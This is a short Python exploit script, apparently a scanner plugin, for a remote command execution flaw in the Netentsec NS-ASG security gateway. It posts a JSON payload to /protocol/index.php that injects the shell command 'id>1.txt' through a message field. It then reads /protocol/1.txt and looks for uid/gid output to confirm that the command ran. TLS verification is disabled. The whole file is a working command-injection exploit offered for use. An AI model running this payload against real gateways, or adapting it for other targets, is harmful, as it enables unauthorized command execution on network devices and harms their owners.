#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/xasSBrhSYuzMNNzNHhpOrQ',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '网康 NS-ASG安全网关 index.php 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html, application/xhtml+xml, image/jxr, */*',
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = '/protocol/index.php'
  data = 'jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200:
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    resp = requests.get(url=url+'/protocol/1.txt',headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',resp.text,re.S):
      ret['huixian'] = resp.text
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret